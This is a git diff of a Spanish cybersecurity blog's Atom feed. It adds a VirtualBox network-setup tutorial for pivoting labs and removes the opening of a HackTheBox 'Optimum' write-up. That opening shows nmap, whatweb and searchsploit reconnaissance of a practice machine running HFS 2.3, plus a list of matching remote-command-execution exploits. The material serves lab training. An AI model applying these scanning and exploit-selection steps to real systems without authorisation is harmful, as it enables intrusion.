@@ -1,4 +1,219 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-15T22:30:49-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB support AD</title><link href="http://localhost:4000/support/" rel="alternate" type="text/html" title="HTB support AD" /><published>2023-03-15T00:00:00-05:00</published><updated>2023-03-15T00:00:00-05:00</updated><id>http://localhost:4000/support</id><content type="html" xml:base="http://localhost:4000/support/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-29T22:54:55-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">Redes virtuales</title><link href="http://localhost:4000/virtualred/" rel="alternate" type="text/html" title="Redes virtuales" /><published>2023-03-29T00:00:00-05:00</published><updated>2023-03-29T00:00:00-05:00</updated><id>http://localhost:4000/virtualred</id><content type="html" xml:base="http://localhost:4000/virtualred/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/02-tarjeta.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Hola! En esta ocasión nos adentraremos en el mundo de la virtualización y configuración de entornos de red en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualBox&lt;/code&gt;, una herramienta muy útil para crear laboratorios de pruebas y ejercicios de pivoting como los que vamos a utilizar en próximos posts.&lt;/p&gt;
+
+&lt;h2 id=&quot;entorno&quot;&gt;ENTORNO&lt;/h2&gt;
+
+&lt;p&gt;Para este ejercicio vamos a hacer uso de 3 máquinas virtuales, 2 Linux y 1 Windows, esto con el fin de diversificar y comprobar que la conectividad entre máquinas no será ningún problema por los entornos que nos encontremos manejando.&lt;/p&gt;
+
+&lt;p&gt;En circunstancias normales tenemos activas máquinas virtuales en conexiones &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Puente&lt;/code&gt; (bridge) o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NAT&lt;/code&gt;, entraré un poco en detalle:&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;&lt;strong&gt;Puente (bridge):&lt;/strong&gt; Conexión de redes lógicas separadas que comparten una misma red física.&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;NAT:&lt;/strong&gt; Conexión de una red privada con acceso a Internet a través de una única dirección IP pública.&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p&gt;Con la nueva configuración, vamos a tener el siguiente ambiente compuesto por 2 redes internas, una por conexión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puente&lt;/code&gt; (bridge) y otra por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host Only Network Adapter&lt;/code&gt; para crear redes privadas virtuales y limitar el acceso de la máquina virtual solo al host en el que se ejecuta.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/03-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;crear-nueva-interfaz&quot;&gt;CREAR NUEVA INTERFAZ&lt;/h2&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Abrir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualBox&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;herramientas&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;menú&lt;/code&gt; de herramientas&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/04-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Una vez en el área de trabajo vemos una interfaz configurada por defecto, sin embargo, vamos a crear una desde cero y será la que vamos a utilizar.&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Crear&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p&gt;Automáticamente se crea una nueva interfaz.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nota:&lt;/strong&gt; &lt;em&gt;Es importante aclarar que necesitas permisos de administrador para crear la interfaz, por lo que te va a pedir una confirmación al momento de crearla.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/05-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;configuración-de-interfaz&quot;&gt;CONFIGURACIÓN DE INTERFAZ&lt;/h2&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Propiedades&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configurar adaptador manualmente&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Configurar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mascara&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aplicar&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/06-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nota:&lt;/strong&gt; &lt;em&gt;Es importante aclarar que necesitas permisos de administrador para configurar la interfaz, por lo que te va a pedir una confirmación al momento de configurar.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;configuración-interfaz-servidor-dhcp&quot;&gt;CONFIGURACIÓN INTERFAZ SERVIDOR DHCP&lt;/h2&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Servidor DHCP&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Habilitar servidor&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Modificar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mascara&lt;/code&gt; (opcional)&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aplicar&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/07-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;configuración-máquina-1&quot;&gt;CONFIGURACIÓN MÁQUINA 1&lt;/h2&gt;
+
+&lt;p&gt;Nuestra primera máquina tendrá conexión directa con la interfaz física, por lo tanto, solo requerimos de un adaptador de red en adaptador puente.&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 1&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador puente&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz&lt;/code&gt; física&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/08-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;configuración-máquina-2&quot;&gt;CONFIGURACIÓN MÁQUINA 2&lt;/h2&gt;
+
+&lt;p&gt;Nuestra segunda máquina tendrá la misma conexión con adaptador puente y otro adaptador de red para la nueva interfaz configurada anteriormente.&lt;/p&gt;
+
+&lt;h3 id=&quot;configuración-interfaz-puente&quot;&gt;CONFIGURACIÓN INTERFAZ PUENTE&lt;/h3&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 1&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador puente&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz&lt;/code&gt; física&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/09-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h3 id=&quot;configuración-interfaz-creada&quot;&gt;CONFIGURACIÓN INTERFAZ CREADA&lt;/h3&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 2&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador sólo-anfitrión&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz creada&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/10-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;configuración-máquina-3&quot;&gt;CONFIGURACIÓN MÁQUINA 3&lt;/h2&gt;
+
+&lt;p&gt;Nuestra tercera máquina tendrá conexión directa con la interfaz creada, por lo tanto, solo requerimos de un adaptador de red en adaptador sólo-anfitrión.&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 2&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador sólo-anfitrión&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz creada&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/11-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;validación-de-conexiones&quot;&gt;VALIDACIÓN DE CONEXIONES&lt;/h2&gt;
+
+&lt;p&gt;Ya tenemos el entorno configurado, ahora vamos a validar si nuestras máquinas tienen la configuración de red correcta.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/12-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Como podemos ver, la primera máquina tiene una dirección asociada a la primera red únicamente, la segunda máquina tiene esta misma red y adicionalmente la red nueva creada a través de la interfaz, por último, la tercera máquina se encuentra asociada a la segunda red interna, también generada por la nueva interfaz.&lt;/p&gt;
+
+&lt;h2 id=&quot;prueba-de-conectividad&quot;&gt;PRUEBA DE CONECTIVIDAD&lt;/h2&gt;
+
+&lt;p&gt;Nuestra configuración ha sido exitosa, tenemos que hacer pruebas de conectividad para corroborar que nuestras redes sean operativas, debemos tener en cuenta lo siguiente:&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;ul&gt;
+    &lt;li&gt;La &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 1&lt;/code&gt; solo puede tener conectividad por el mismo segmento de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 2&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;La &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 2&lt;/code&gt; tiene conectividad por el mismo segmento de las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquinas 1 y 2&lt;/code&gt;&lt;/li&gt;
+    &lt;li&gt;La &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 3&lt;/code&gt; solo puede tener conectividad por el mismo segmento de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina 2&lt;/code&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/virtualred/13-virtual.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Con esta configuración vamos a tener la posibilidad de crear nuevos entornos para practicar nuestros ejercicios de hacking orientados al pivoting, tema bastante importante para certificaciones como la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eCPPT&lt;/code&gt;, crear laboratorios propios nos da una ventaja en no depender de otras infraestructuras para practicar, así que esperen una corta serie pero de mucho aprendizaje en los próximos posts.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Configuraciones" /><category term="Virtualbox" /><summary type="html">Vamos a crear una red virtual para entornos de pivoting. ¡Let's hack!</summary></entry><entry><title type="html">HTB support AD</title><link href="http://localhost:4000/support/" rel="alternate" type="text/html" title="HTB support AD" /><published>2023-03-15T00:00:00-05:00</published><updated>2023-03-15T00:00:00-05:00</updated><id>http://localhost:4000/support</id><content type="html" xml:base="http://localhost:4000/support/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/support/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -4015,218 +4230,4 @@ find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; root.txt 2&amp;gt;/de
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;.&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Beep" /><summary type="html">Vamos a resolver la máquina Beep de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB Optimum</title><link href="http://localhost:4000/optimum/" rel="alternate" type="text/html" title="HTB Optimum" /><published>2022-11-09T00:00:00-05:00</published><updated>2022-11-09T00:00:00-05:00</updated><id>http://localhost:4000/optimum</id><content type="html" xml:base="http://localhost:4000/optimum/">&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/optimum/02-tarjeta.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;¡Hola!
-En esta ocasión vamos a resolver de la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;optimum&lt;/code&gt; de &lt;a href=&quot;https://hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
-La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
-
-&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
-
-&lt;p&gt;Para iniciar nuestra máquina, vamos a crear con nuestra función &lt;a href=&quot;https://bast1ant1c.github.io/mkhack/&quot;&gt;mkhack&lt;/a&gt; un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;optimum&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkhack optimum
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;recon
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
-
-&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad &lt;a href=&quot;https://bast1ant1c.github.io/osping/&quot;&gt;osping&lt;/a&gt; detectando el tipo de sistema operativo basado en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttl&lt;/code&gt; &lt;em&gt;time to live&lt;/em&gt; de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;osping 10.10.10.8
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Detectando sistema operativo ...
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.8 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; Windows
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Windows&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
-  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.8 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; ports | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
-80/tcp open  http
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.10.8 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; versions
-PORT   STATE SERVICE VERSION
-80/tcp open  http    HttpFileServer httpd 2.3
-|_http-title: HFS /
-|_http-server-header: HFS 2.3
-Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reconocimiento-web&quot;&gt;RECONOCIMIENTO WEB&lt;/h2&gt;
-
-&lt;p&gt;Iniciamos con el reconocimiento del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; donde inicialmente, por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; enumeramos información de librerías, gestores de contenido, entre otros.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb 10.10.10.8
-http://10.10.10.8 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;intrusion&quot;&gt;INTRUSION&lt;/h2&gt;
-
-&lt;p&gt;Hacemos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; buscando potenciales maneras de intrusión por medio de la explotación de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HFS 2.3&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit HFS 2.3
-&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------------------------------&lt;/span&gt;
- Exploit Title                                                                                                                      |  Path
-&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------------------------------&lt;/span&gt;
-HFS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HTTP File Server&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.3.x - Remote Command Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                         | windows/remote/49584.py
-HFS Http File Server 2.3m Build 300 - Buffer Overflow &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PoC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                         | multiple/remote/48569.py
-Rejetto HTTP File Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HFS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.2/2.3 - Arbitrary File Upload                                                                      | multiple/remote/30850.txt
-Rejetto HTTP File Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HFS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.3.x - Remote Command Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                 | windows/remote/34668.txt
-Rejetto HTTP File Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HFS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.3.x - Remote Command Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                 | windows/remote/39161.py
-Rejetto HTTP File Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HFS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.3a/2.3b/2.3c - Remote Command Execution                                                           | windows/webapps/34852.txt
-&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------------------------------&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a ubicarnos en la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt; y a descargar el exploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows/remote/39161.py&lt;/code&gt;.&lt;/p&gt;
-
